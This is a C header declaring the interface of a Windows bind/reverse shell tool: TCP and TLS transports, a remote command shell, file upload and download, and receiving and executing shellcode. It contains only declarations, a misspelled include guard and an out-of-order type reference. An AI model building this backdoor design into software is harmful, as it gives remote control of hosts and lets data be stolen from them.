#ifndef _BINDHSELL_H
#define _BINDSHELL_H

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <tchar.h>
#include <WinSock2.h>
#include <Ws2tcpip.h>
#include <Windows.h>

#define SECURITY_WIN32
#include <sspi.h>
#include <Schannel.h>

#pragma comment(lib,"ws2_32.lib")

#define MALLOC(X) (HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, X))
#define REALLOC(X, Y) (HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, X, Y))
#define FREE(X) (HeapFree(GetProcessHeap(), 0, X))

/* Debug */
VOID Hexdump(PCHAR lpData, DWORD dwSize);

typedef struct
{
    LPCWSTR lpHostname;
    LPCWSTR lpPort;
    BOOL useTLs;
    BOOL doShell;
    LPCWSTR lpCommandLine;
    BOOL doReceiveFile;
    BOOL doSendFile;
    LPCWSTR lpFilename;
    BOOL doShellcode;
    DWORD dwDelay;
} CONFIG, *PCONFIG;

typedef DWORD(*LPTCP4HANDLER)(SOCKET);

/* TCP4 Support */
SOCKET Tcp4Connect(LPCWSTR lpHostname, LPCWSTR lpPort);
SOCKET Tcp4Bind(DWORD dwPort);
DWORD Tcp4ListenLoop(SOCKET SocketServer, LPTCP4HANDLER lpHandler);
DWORD Tcp4Close(SOCKET Socket);

/* TLS */
DWORD LoadSecurityInterface();
DWORD TlsCreateCredentials(PCredHandle phCreds);
SECURITY_STATUS TlsPerformClientHandshake(SOCKET Socket, PCredHandle phCreds, LPCWSTR pszServerName, PCtxtHandle phContext, PSecBuffer pExtraData);
SECURITY_STATUS ClientHandshakeLoop(SOCKET Socket, PCredHandle phCreds, PCtxtHandle phContext, BOOL bDoInitialRead, PSecBuffer pExtraData);
DWORD TlsSend(SOCKET Socket, PCredHandle phCreds, CtxtHandle *phContext, PBYTE lpBuffer, DWORD dwLength);
DWORD TlsRecv(SOCKET Socket, PCredHandle phCreds, CtxtHandle *phContext, PBYTE lpBuffer, DWORD dwLength);
DWORD TlsClose(SOCKET Socket, PCredHandle phCreds, CtxtHandle *phContext);
SSIZE_T TlsGetMaxBufferSize(PCtxtHandle phContext);

/* Transport */
typedef struct
{
    DWORD(*Deinit)(PCTX_TRANSPORT_INFO);
    DWORD(*Connect)(PCTX_TRANSPORT_INFO);
    DWORD(*Disconnect)(PCTX_TRANSPORT_INFO);
    DWORD(*Read)(PCTX_TRANSPORT_INFO, PCHAR, DWORD);
    DWORD(*Write)(PCTX_TRANSPORT_INFO, PCHAR, DWORD);
    DWORD(*GetMaxBufferSize)(PCTX_TRANSPORT_INFO);
    PVOID lpCtxInfo;
} CTX_TRANSPORT_INFO, *PCTX_TRANSPORT_INFO;

/* Socket transport */
typedef struct
{
    SOCKET Socket;
    LPCWSTR lpHostname;
    LPCWSTR lpPort;
} CTX_SOCKET_INFO, *PCTX_SOCKET_INFO;

BOOL TransportSocketInit(PCTX_TRANSPORT_INFO *self, LPCWSTR lpHostname, LPCWSTR lpPort);
BOOL TransportSocketDeinit(PCTX_TRANSPORT_INFO *self);
BOOL TransportSocketConnect(PCTX_TRANSPORT_INFO self);
BOOL TransportSocketDisconnect(PCTX_TRANSPORT_INFO self);
DWORD TransportSocketRead(PCTX_TRANSPORT_INFO self, PBYTE lpBuffer, DWORD dwSize);
DWORD TransportSocketWrite(PCTX_TRANSPORT_INFO self, PBYTE lpBuffer, DWORD dwSize);
SIZE_T TransportSocketGetMaxBufferSize(PCTX_TRANSPORT_INFO self);

/* TLS transport */
typedef struct
{
    SOCKET Socket;
    LPCWSTR lpHostname;
    LPCWSTR lpPort;
    CredHandle hClientCreds;
    CtxtHandle hContext;
} CTX_TLS_INFO, *PCTX_TLS_INFO;

BOOL TransportTlsInit(PCTX_TRANSPORT_INFO *self, LPCWSTR lpHostname, LPCWSTR lpPort);
BOOL TransportTlsConnect(PCTX_TRANSPORT_INFO self);
BOOL TransportTlsDisconnect(PCTX_TRANSPORT_INFO self);
DWORD TransportTlsRead(PCTX_TRANSPORT_INFO self, PBYTE lpBuffer, DWORD dwSize);
DWORD TransportTlsWrite(PCTX_TRANSPORT_INFO self, PBYTE lpBuffer, DWORD dwSize);
SIZE_T TransportTlsGetMaxBufferSize(PCTX_TRANSPORT_INFO self);

/* Shell */
DWORD ShellExecuteChild(PCTX_TRANSPORT_INFO lpTransportInfo, LPCWSTR lpCommandLine);

/* File */
DWORD FileReceive(PCTX_TRANSPORT_INFO lpTransportInfo, LPCWSTR lpFilename);
DWORD FileSend(PCTX_TRANSPORT_INFO lpTransportInfo, LPCWSTR lpFilename);

/* Command-Line */
BOOL ParseCommandLine(PCONFIG lpConfig, int argc, PWCHAR *argv);

/* Shellcode */
DWORD ShellcodeReceiveExecute(PCTX_TRANSPORT_INFO lpTransportInfo);

#endif /* _BINDSHELL_H */